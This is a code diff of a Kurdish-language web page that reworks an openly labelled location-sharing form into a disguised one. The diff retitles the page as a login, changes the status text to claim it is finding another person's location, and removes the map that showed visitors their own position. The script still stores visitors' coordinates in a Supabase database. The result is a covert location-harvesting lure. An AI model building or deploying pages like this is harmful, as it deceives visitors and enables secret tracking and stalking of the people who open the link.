@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location Access</title>
+  <title>Access</title>
 
   <!-- Leaflet CSS -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -113,7 +113,7 @@
 <body>
 
   <div class="card">
-    <h2>هاوبەشکردنی شوێن</h2>
+    <h2>چونەژورەوە</h2>
     <p>تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.</p>
 
     <input type="text" id="username" placeholder="ناوەکەت بنووسە..." />
@@ -168,30 +168,13 @@
         return;
       }
 
-      result.innerHTML = "<span style='color: #3b82f6;'>⏳ داواکاری وەرگرتنی شوێن دەکەین...</span>";
+      result.innerHTML = "<span style='color: #3b82f6;'>⏳ داواکاری وەرگرتنی شوێن ئەوکەسە کە دەتەوێ دەکەین...</span>";
 
       navigator.geolocation.getCurrentPosition(
         async function (position) {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
 
-          // پێشاندانی نەخشە
-          mapDiv.style.display = "block";
-
-          if (mapInstance) {
-            mapInstance.remove();
-          }
-
-          mapInstance = L.map("map").setView([latitude, longitude], 15);
-
-          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-            attribution: "&copy; OpenStreetMap"
-          }).addTo(mapInstance);
-
-          L.marker([latitude, longitude])
-            .addTo(mapInstance)
-            .bindPopup(`شوێنی: ${name}`)
-            .openPopup();
 
           // تۆمارکردن لە Supabase
           const { error } = await supabaseClient
